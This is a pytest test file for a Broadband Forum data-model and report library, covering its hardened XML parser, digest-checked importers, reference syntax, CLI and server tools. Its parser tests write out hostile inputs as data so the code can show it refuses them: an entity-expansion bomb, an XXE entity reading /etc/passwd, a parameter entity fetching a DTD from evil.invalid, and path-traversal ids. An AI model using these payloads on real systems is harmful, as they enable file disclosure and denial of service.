"""bbf: the hardened XML parser, the data-model reader, the importers, the refs and tools, over invented files."""

from __future__ import annotations

import asyncio
import json
from pathlib import Path

import pytest
from bbf_fixture import BASE, COMMIT, MODEL_XML, REPORT_URL, catalogue, install, pdf, sha, transport

from primarysource import cli, registry
from primarysource.bbf import BBF, _xml, datamodel, library
from primarysource.bbf.catalogue import HOSTS, parse_catalogue
from primarysource.bbf.catalogue import catalogue as packaged_catalogue
from primarysource.bbf.importer import import_models, import_report, pin_models, read_record
from primarysource.c2sp._fetch import Fetcher
from primarysource.errors import LibError

NODE = "tr-999-1-0-0-widget"


class FakeClock:
    """A clock and sleep that move together, so the one-request-per-second test takes no real time."""

    def __init__(self) -> None:
        self.now = 0.0
        self.sleeps: list[float] = []

    def clock(self) -> float:
        return self.now

    def sleep(self, seconds: float) -> None:
        self.sleeps.append(seconds)
        self.now += seconds


@pytest.fixture(autouse=True)
def _pypdf_text(monkeypatch: pytest.MonkeyPatch) -> None:
    """Read test PDFs with pypdf whatever is on PATH, so the text is the same on every machine."""
    monkeypatch.setattr("primarysource.ecma._pdf.shutil.which", lambda _name: None)


@pytest.fixture
def home(tmp_path: Path) -> Path:
    pytest.importorskip("pypdf")
    return install(tmp_path / "bbf")


# --- the hardened XML parser -----------------------------------------------------------------------------------

BOMB = (
    b'<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;">'
    b'<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;">]><lolz>&lol3;</lolz>'
)
XXE = b'<?xml version="1.0"?><!DOCTYPE d [<!ENTITY x SYSTEM "file:///etc/passwd">]><d>&x;</d>'
PARAMETER = b'<!DOCTYPE d [<!ENTITY % p SYSTEM "http://evil.invalid/p.dtd"> %p;]><d/>'


@pytest.mark.parametrize("hostile", [BOMB, XXE, PARAMETER, b"<! DOCTYPE d><d/>", b"<!doctype d []><d/>"])
def test_a_document_type_declaration_is_refused_whatever_it_declares(hostile: bytes) -> None:
    with pytest.raises(LibError, match="document type declaration"):
        _xml.parse(hostile)


def test_a_declaration_hidden_by_the_encoding_is_still_refused() -> None:
    utf16 = '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE a [<!ENTITY e "x">]><a>&e;</a>'.encode("utf-16")
    with pytest.raises(LibError, match="document type declaration"):
        _xml.parse(utf16)


def test_an_undefined_entity_and_broken_markup_are_not_resolved() -> None:
    for bad in (b"<a>&foo;</a>", b"<a><b></a>", b"", b"<a/><b/>", b"not xml"):
        with pytest.raises(LibError):
            _xml.parse(bad)
    assert _xml.parse(b"<a>&amp;&#65;&lt;</a>").text == "&A<"


def test_bounds_on_depth_attributes_and_size() -> None:
    with pytest.raises(LibError, match="bounds"):
        _xml.parse(b"<a>" * (_xml.MAX_DEPTH + 1) + b"</a>" * (_xml.MAX_DEPTH + 1))
    many = " ".join(f'k{i}="v"' for i in range(_xml.MAX_ATTRIBUTES + 1))
    with pytest.raises(LibError, match="bounds"):
        _xml.parse(f"<a {many}/>".encode())
    with pytest.raises(LibError, match="byte bound"):
        _xml.parse(b"<a>" + b"x" * _xml.MAX_BYTES + b"</a>")


def test_namespace_prefixes_are_dropped_and_text_and_tails_are_kept() -> None:
    root = _xml.parse(b'<dm:d xmlns:dm="u" xsi:k="1" a="2"><dm:e>one<b/>two</dm:e></dm:d>')
    assert root.tag == "d" and root.attrib == {"a": "2"}
    assert "".join(root.itertext()) == "onetwo"


# --- the data-model reader -------------------------------------------------------------------------------------


def test_nodes_have_full_paths_kinds_and_headers() -> None:
    model = datamodel.parse(MODEL_XML.encode())
    assert model.title == "Invented Data Model: Widgets [Widget]"
    assert model.spec == "urn:invented:tr-999-1-0-0-widget" and model.imports == ("tr-999-biblio.xml",)
    assert [(n.kind, n.id) for n in model.nodes] == [
        ("datatype", "Gasket"),
        ("object", "Device.Widget"),
        ("parameter", "Device.Widget.Enable"),
        ("parameter", "Device.Widget.Mode"),
        ("command", "Device.Widget.Spin()"),
        ("parameter", "Device.Widget.Spin().Input.Turns"),
        ("parameter", "Device.Widget.Spin().Output.Done"),
        ("event", "Device.Widget.Jammed!"),
        ("object", "Device.Widget.Flange.{i}"),
        ("parameter", "Device.Widget.Flange.{i}.Size"),
        ("profile", "Baseline:1"),
        ("model", "Widget:1.0"),
    ]
    enable, _ = model.find("Device.Widget.Enable")
    assert (
        enable.header()
        == "parameter Device.Widget.Enable  [access=readWrite type=boolean default='false']  (component Widget)"
    )
    mode, _ = model.find("Device.Widget.Mode")
    assert "type=string(size=..8) enum=Fast|Slow" in mode.header() and "version=2.1" in mode.header()
    size, _ = model.find("Device.Widget.Flange.{i}.Size")
    assert "type=list of int(items=..4)" in size.header()
    turns, _ = model.find("Device.Widget.Spin().Input.Turns")
    assert "type=unsignedInt(range=1..9)" in turns.header()


def test_descriptions_are_paragraphs_and_macros_are_left_alone() -> None:
    model = datamodel.parse(MODEL_XML.encode())
    top, _ = model.find("Device.Widget")
    assert top.paragraphs == ("The top-level widget object.", "It has a second paragraph about sprockets.")
    enable, _ = model.find("Device.Widget.Enable")
    assert enable.paragraphs == ("Enables the widget. {{param}} is a template macro.",)


def test_lookup_forms_children_profiles_and_close_matches() -> None:
    model = datamodel.parse(MODEL_XML.encode())
    assert model.find("Device.Widget.Flange.{i}.")[0].id == "Device.Widget.Flange.{i}"  # trailing dot
    assert model.find("device.widget.enable")[0].id == "Device.Widget.Enable"  # case
    top, _ = model.find("Device.Widget")
    assert [c.id for c in model.children(top)] == [
        "Device.Widget.Enable",
        "Device.Widget.Mode",
        "Device.Widget.Spin()",
        "Device.Widget.Jammed!",
    ]
    profile, _ = model.find("Baseline:1")
    assert profile.paragraphs[0] == "The baseline profile."
    assert profile.paragraphs[1:] == (
        "object Device.Widget. requires readOnly",
        "parameter Device.Widget.Enable requires readWrite",
    )
    with pytest.raises(LibError) as raised:
        model.find("Device.Widget.Enabel")
    assert "did you mean: Device.Widget.Enable" in raised.value.hint


def test_a_node_defined_twice_warns_and_the_first_wins() -> None:
    twice = MODEL_XML.replace("</component>", '<object name="Device.Widget." access="readOnly"/></component>')
    node, warning = datamodel.parse(twice.encode()).find("Device.Widget")
    assert warning == "2 definitions of Device.Widget; this is the first" and node.paragraphs[0].startswith(
        "The top-level"
    )


def test_a_file_that_is_not_a_data_model_is_refused() -> None:
    with pytest.raises(LibError, match="not a data-model document"):
        datamodel.parse(b"<html/>")


# --- the importers ---------------------------------------------------------------------------------------------


def test_models_are_verified_parsed_and_recorded(tmp_path: Path) -> None:
    result = import_models(tmp_path, cat=catalogue(), transport=transport())
    assert result.ids == (NODE,) and result.requests == 1
    assert (tmp_path / "models" / f"{NODE}.xml").read_bytes() == MODEL_XML.encode()
    record = json.loads((tmp_path / "install.json").read_text(encoding="utf-8"))
    assert (
        record["commit"] == COMMIT
        and record["models"][NODE] == sha(MODEL_XML.encode())
        and record["models_licence"] == "BSD-3-Clause"
    )


def test_a_model_with_the_wrong_digest_or_a_dtd_is_not_installed(tmp_path: Path) -> None:
    with pytest.raises(LibError, match="does not match the pinned"):
        import_models(tmp_path, cat=catalogue(), transport=transport({NODE: MODEL_XML + " "}))
    assert not (tmp_path / "models").exists() or not list((tmp_path / "models").iterdir())
    evil = {NODE: XXE.decode()}
    with pytest.raises(LibError, match="document type declaration"):  # pinned, digest right, still refused
        import_models(tmp_path, cat=catalogue(evil), transport=transport(evil))
    assert not (tmp_path / "models" / f"{NODE}.xml").exists()


def test_only_the_named_hosts_and_one_request_per_second_hold(tmp_path: Path) -> None:
    with pytest.raises(LibError, match="refusing"):
        import_models(tmp_path, cat=catalogue(base="https://evil.invalid/"), transport=transport())
    clock = FakeClock()
    fetcher = Fetcher(HOSTS, transport(), clock=clock.clock, sleep=clock.sleep)
    fetcher.get(f"{BASE}{COMMIT}/{NODE}.xml", 100_000)
    fetcher.get(REPORT_URL, 10_000_000)
    assert clock.sleeps == [1.0]


def test_a_report_is_verified_stored_and_extracted(tmp_path: Path) -> None:
    pytest.importorskip("pypdf")
    result = import_report(tmp_path, "tr-999-1-0-0", cat=catalogue(), transport=transport())
    assert result.ids == ("tr-999-1-0-0",) and result.requests == 1
    assert (tmp_path / "reports" / "tr-999-1-0-0.pdf").read_bytes() == pdf()
    stored = json.loads((tmp_path / "reports" / "tr-999-1-0-0.json").read_text(encoding="utf-8"))
    assert [s["id"] for s in stored["sections"]] == ["1", "2", "2.1", "2.2", "3", "A", "bibliography"]
    assert stored["extractor"].startswith("pypdf") and stored["designation"] == "TR-999"
    assert read_record(tmp_path)["reports"]["tr-999-1-0-0"]["sha256"] == sha(pdf())


def test_a_report_can_come_from_a_file_and_a_bad_one_writes_nothing(tmp_path: Path) -> None:
    pytest.importorskip("pypdf")
    mine = tmp_path / "mine.pdf"
    mine.write_bytes(pdf())
    import_report(tmp_path / "home", "tr-999-1-0-0", file=mine, cat=catalogue())
    assert (tmp_path / "home" / "reports" / "tr-999-1-0-0.json").is_file()
    junk = b"%PDF-1.4 this is not really a pdf"
    with pytest.raises(LibError, match="could not read the PDF|no bookmarks"):
        import_report(
            tmp_path / "bad", "tr-999-1-0-0", cat=catalogue(pdf_bytes=junk), transport=transport(pdf_bytes=junk)
        )
    assert not list((tmp_path / "bad").rglob("*.pdf*"))
    html = b"<html>an error page</html>"
    with pytest.raises(LibError, match="not a PDF"):
        import_report(
            tmp_path / "bad2", "tr-999-1-0-0", cat=catalogue(pdf_bytes=html), transport=transport(pdf_bytes=html)
        )
    with pytest.raises(LibError, match="cannot read"):
        import_report(tmp_path / "bad3", "tr-999-1-0-0", file=tmp_path / "missing.pdf", cat=catalogue())


def test_pin_models_reports_title_size_and_digest() -> None:
    pinned = pin_models(BASE, COMMIT, [NODE], Fetcher(HOSTS, transport(), min_interval=0))
    assert (pinned[0].title, pinned[0].sha256) == ("Invented Data Model: Widgets [Widget]", sha(MODEL_XML.encode()))
    with pytest.raises(LibError, match="not a data-model file stem"):
        pin_models(BASE, COMMIT, ["../x"], Fetcher(HOSTS, transport()))


def test_the_packaged_catalogue_pins_models_and_tr_069() -> None:
    cat = packaged_catalogue()
    assert cat.commit == "049759159f40499f5155be0d21f2573c6381969f"
    assert cat.model_terms.licence == "BSD-3-Clause" and cat.model_terms.placement == "layer"
    assert cat.report_terms.placement == "volume"
    report = cat.report("tr-069-1-6-1")
    assert (report.size, report.sha256) == (
        3066832,
        "21622e4ab362f0b31d5ce15f40bd259dc28cedba095046cf48b5cac2512ba115",
    )
    assert "tr-181-2-22-0-ip" in {m.id for m in cat.models} and "tr-106-types" not in {m.id for m in cat.models}
    bad = {"id": "A_B", "path": "A_B.xml", "title": "t", "size": 1, "sha256": "0" * 64}
    raw = {"repo": "r", "commit": "0" * 40, "raw_base": "b", "terms": {"models": _terms(), "reports": _terms()}}
    with pytest.raises(ValueError, match="malformed"):
        parse_catalogue({**raw, "models": [bad], "reports": []})


def _terms() -> dict[str, str]:
    return {"licence": "l", "placement": "layer", "terms_url": "u", "terms_read": "d", "summary": "s"}


# --- refs and tools: data models -------------------------------------------------------------------------------


def test_refs_parse_paths_commands_events_and_profiles() -> None:
    for section in (
        "Device.Widget.Flange.{i}.Size",
        "Device.Widget.Spin()",
        "Device.Widget.Jammed!",
        "Baseline:1",
        "3.5",
        "A.3.2.3",
    ):
        ref = library.parse_ref(f"bbf:tr-181-2-22-0-ip§{section}¶2")
        assert (ref.doc, ref.section, ref.para) == ("tr-181-2-22-0-ip", section, 2)
    for bad in ("", "tr-069-1-6-1:1-3", "tr-069-1-6-1#x", "§3.5", "bbf:"):
        with pytest.raises(LibError):
            library.parse_ref(bad)


def test_read_a_model_overview_object_parameter_and_paragraph(home: Path) -> None:
    overview = library.read(NODE, home=home)
    assert "nodes: " in overview and "datatype" in overview
    assert "imports: tr-999-biblio.xml" in overview
    obj = library.read(f"{NODE}§Device.Widget", home=home)
    assert obj.startswith("object Device.Widget  [access=readOnly")
    assert "contains: Enable, Mode, Spin(), Jammed!" in obj
    assert "The top-level widget object.\n\nIt has a second paragraph about sprockets." in obj
    assert (
        "cite: Broadband Forum, tr-999-1-0-0-widget.xml" in obj
        and "unit: paragraph" in obj
        and "span: sha256:" in obj
    )
    para = library.read(f"bbf:{NODE}§Device.Widget¶2", home=home)
    assert para.startswith("It has a second paragraph about sprockets.\n")
    assert "{{param}}" in library.read(f"{NODE}§Device.Widget.Enable¶1", home=home)  # macros stay as published
    with pytest.raises(LibError, match="1 paragraphs"):
        library.read(f"{NODE}§Device.Widget.Enable¶2", home=home)
    with pytest.raises(LibError, match="not a ref"):
        library.read(f"{NODE}¶1", home=home)


def test_a_paged_model_read_continues(home: Path) -> None:
    first = library.read(f"{NODE}§Device.Widget", max_tokens=1, home=home)
    assert "next: start=2" in first
    assert "second paragraph" in library.read(f"{NODE}§Device.Widget", start=2, max_tokens=1, home=home)


def test_outline_of_a_model_pages_and_goes_below_a_node(home: Path) -> None:
    top = library.outline(NODE, home=home)
    assert "  object Device.Widget" in top.splitlines()
    assert "    object Device.Widget.Flange.{i}" in top
    assert "parameter" not in top
    below = library.outline(NODE, under="Device.Widget", home=home)
    assert "parameter Device.Widget.Enable" in below and "command Device.Widget.Spin()" in below
    assert "parameter Device.Widget.Spin().Input.Turns" in below
    paged = library.outline(NODE, under="Device.Widget", limit=2, home=home)
    assert "next: start=3" in paged
    with pytest.raises(LibError, match="nothing under"):
        library.outline(NODE, under="Device.Nope", home=home)


def test_search_finds_names_and_descriptions_and_cites(home: Path) -> None:
    by_path = library.search("Widget Flange", doc=NODE, home=home)
    assert by_path.startswith(f"bbf:{NODE}§Device.Widget.Flange.{{i}}: object Device.Widget.Flange.{{i}}")
    by_text = library.search("second paragraph sprockets", doc=NODE, home=home)
    assert by_text.startswith(f"bbf:{NODE}§Device.Widget¶2: It has a second paragraph about sprockets.")
    cited = library.cite(f"{NODE}§Device.Widget.Mode¶1", home=home)
    assert "parameter Device.Widget.Mode ¶1. BSD-3-Clause." in cited
    assert f"span: sha256:{sha(b'The mode of the widget. {{enum}}')[:16]}" in cited
    assert library.search("zzzz", home=home) == "no matches\n"


def test_docs_lists_reports_and_models(home: Path) -> None:
    listing = library.docs(home=home)
    assert "placement volume" in listing and "not imported  tr-069-1-6-1" in listing
    assert library.docs("ssh", home=home).count("not imported") == 1  # the ssh model only; the report filtered out


def test_an_edited_install_and_unknown_documents_fail_with_a_remedy(home: Path, tmp_path: Path) -> None:
    path = home / "models" / f"{NODE}.xml"
    path.write_bytes(path.read_bytes() + b"\n")
    with pytest.raises(LibError, match="does not match its recorded sha256"):
        library.read(f"{NODE}§Device.Widget", home=home)
    with pytest.raises(LibError, match="tr-181-2-22-0-ip is not imported") as missing:
        library.read("tr-181-2-22-0-ip§Device.IP", home=home)
    assert "import-models" in missing.value.hint
    with pytest.raises(LibError, match="not a Broadband Forum document id"):
        library.load("../evil", home)
    with pytest.raises(LibError, match="no Broadband Forum documents are imported"):
        library.search("x", home=tmp_path / "none")


# --- refs and tools: reports -----------------------------------------------------------------------------------


def test_read_a_report_clause_its_sentences_and_a_page(home: Path) -> None:
    clause = library.read("bbf:tr-999-1-0-0§2", home=home)
    assert clause.startswith(
        "A gasket is a seal.\nA sprocket is a toothed wheel.\n§2.1 Gasket\nA gasket MUST be round.\n§2.2 Sprocket"
    )
    assert (
        "unit: sentence" in clause and "cite: Broadband Forum, TR-999 Invented Standard, Issue 1, §2 Terms." in clause
    )
    one = library.read("tr-999-1-0-0§2¶2", home=home)
    assert one.startswith("A sprocket is a toothed wheel.\n")
    assert library.read("tr-999-1-0-0§A", home=home).startswith("The registry lists flanges.")
    assert library.read("tr-999-1-0-0§bibliography¶1", home=home).startswith("RFC 9999 is invented.")
    assert "next: start=2" in library.read("tr-999-1-0-0§2", max_tokens=1, home=home)
    with pytest.raises(LibError, match="span has"):
        library.read("tr-999-1-0-0§2¶99", home=home)
    with pytest.raises(LibError) as raised:
        library.read("tr-999-1-0-0§9", home=home)
    assert "did you mean" in raised.value.hint or "outline" in raised.value.hint


def test_report_outline_search_and_cite(home: Path) -> None:
    outline = library.outline("tr-999-1-0-0", home=home)
    assert "TR-999 Invented Standard, Issue 1  [tr-999-1-0-0, 5 pages]" in outline
    assert "  2.1 Gasket  bbf:tr-999-1-0-0§2.1  (p. 2)" in outline
    hits = library.search("gasket MUST round", doc="tr-999-1-0-0", home=home)
    assert hits.startswith("bbf:tr-999-1-0-0§2.1¶1: A gasket MUST be round.")
    cited = library.cite("tr-999-1-0-0§2.1¶1", home=home)
    assert f"span: sha256:{sha(b'A gasket MUST be round.')[:16]}" in cited


def test_page_furniture_is_not_in_the_text(home: Path) -> None:
    everything = library.read("tr-999-1-0-0", max_tokens=5000, home=home)
    assert "INVENTED STANDARD 9999" not in everything and "Page 2 of 5" not in everything
    assert "Draft for tests only" not in everything


# --- the command and the server --------------------------------------------------------------------------------


@pytest.fixture
def registered(home: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    monkeypatch.setenv("PRIMARYSOURCE_HOME", str(home.parent))
    return home


def test_the_command_runs_through_the_core_cli(registered: Path, capsys: pytest.CaptureFixture[str]) -> None:
    assert cli.main(["bbf", "read", f"{NODE}§Device.Widget.Enable¶1"]) == 0
    assert capsys.readouterr().out.startswith("Enables the widget.")
    for args in (
        ["outline", NODE],
        ["outline", "tr-999-1-0-0"],
        ["search", "gasket"],
        ["cite", "tr-999-1-0-0§2"],
        ["docs"],
    ):
        assert cli.main(["bbf", *args]) == 0
    capsys.readouterr()
    assert cli.main(["bbf", "read", f"{NODE}§Device.Nope"]) == 1
    assert "hint:" in capsys.readouterr().err


def test_the_collection_object_declares_prefix_and_grammar() -> None:
    assert (BBF.name, BBF.prefix) == ("bbf", "bbf_")
    assert BBF.grammar.parse("tr-069-1-6-1§3.5¶2").section == "3.5"


def test_the_server_exposes_prefixed_tools(registered: Path) -> None:
    pytest.importorskip("mcp")
    from mcp.server.mcpserver.exceptions import ToolError

    server = registry.attribute(BBF, BBF.server, "server")
    names = [tool.name for tool in asyncio.run(server.list_tools())]
    assert names == ["bbf_read", "bbf_search", "bbf_outline", "bbf_cite", "bbf_docs"]
    result = asyncio.run(server.call_tool("bbf_read", {"ref": f"{NODE}§Device.Widget.Enable¶1"}))
    assert "Enables the widget." in str(result)
    with pytest.raises(ToolError, match="hint: did you mean"):
        asyncio.run(server.call_tool("bbf_read", {"ref": f"{NODE}§Device.Widget.Enabl"}))


def test_the_collection_grammar_is_the_real_parser() -> None:
    grammar = BBF.grammar
    ref = grammar.parse("bbf:tr-069-1-6-1§3.5¶2")
    assert grammar.parse(grammar.format(ref)) == ref
    with pytest.raises(LibError):
        grammar.parse("tr-069#x")
